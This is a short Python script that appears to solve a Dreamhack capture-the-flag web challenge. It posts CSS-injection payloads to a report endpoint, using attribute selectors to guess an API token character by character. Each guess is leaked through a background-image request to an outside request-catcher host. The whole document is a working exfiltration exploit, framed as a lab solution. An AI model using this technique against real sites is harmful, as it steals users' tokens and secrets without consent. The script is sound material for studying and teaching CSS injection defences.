from string import ascii_lowercase
import requests
from concurrent.futures import ThreadPoolExecutor

URL = "http://host1.dreamhack.games:19609/report"

for ch in ascii_lowercase:

    data = {
        "path": "mypage?color=black;}"
        + "input[id=InputApitoken][value^="
        + f"jmgcdvm{ch}]"
        + "{background: url(https://gvvkucq.request.dreamhack.games/"
        + f"jmgcdvm{ch})"
    }

    print(data["path"])
    res = requests.post(URL, data=data)
